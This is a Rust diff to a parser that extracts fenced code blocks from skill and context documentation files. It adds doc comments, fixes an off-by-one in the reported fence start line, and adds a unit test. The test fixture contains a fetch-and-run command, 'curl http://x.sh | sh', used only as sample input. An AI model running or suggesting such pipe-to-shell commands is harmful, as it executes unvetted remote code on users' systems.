@@ -3,6 +3,7 @@
 
 use std::path::{Path, PathBuf};
 
+/// Type of documentation file being parsed.
 #[derive(Debug, Clone, Copy, PartialEq, Eq)]
 pub enum DocKind {
     Skill,
@@ -10,13 +11,16 @@ pub enum DocKind {
     Rules,
 }
 
+/// A fenced code block extracted from a documentation file.
 #[derive(Debug, Clone, PartialEq)]
 pub struct Fence {
     pub lang: String,
+    /// 1-based line number of the first content line inside the fence (the line just after the opening delimiter).
     pub start_line: usize,
     pub lines: Vec<String>,
 }
 
+/// A parsed skill or context documentation file containing extracted fenced code blocks.
 #[derive(Debug, Clone)]
 pub struct SkillDoc {
     pub source: PathBuf,
@@ -70,7 +74,7 @@ pub fn parse_doc(path: &Path, kind: DocKind, text: &str) -> SkillDoc {
                         .next()
                         .unwrap_or("")
                         .to_ascii_lowercase();
-                    open = Some((c, run, lang, idx + 1, Vec::new()));
+                    open = Some((c, run, lang, idx + 2, Vec::new()));
                 }
             }
             Some((c, run, lang, start, buf)) => {
@@ -161,5 +165,14 @@ mod tests {
         let md = "line1\nline2\n";
         let doc = parse_doc(Path::new("x.md"), DocKind::Context, md);
         assert_eq!(doc.raw, md);
+    }
+
+    #[test]
+    fn start_line_points_at_first_content_line() {
+        let md = "intro\n```bash\ncurl http://x.sh | sh\n```\n";
+        let doc = parse_doc(Path::new("SKILL.md"), DocKind::Skill, md);
+        assert_eq!(doc.fences.len(), 1);
+        // Opening ``` is on line 2 (1-based), first content line is on line 3.
+        assert_eq!(doc.fences[0].start_line, 3);
     }
 }
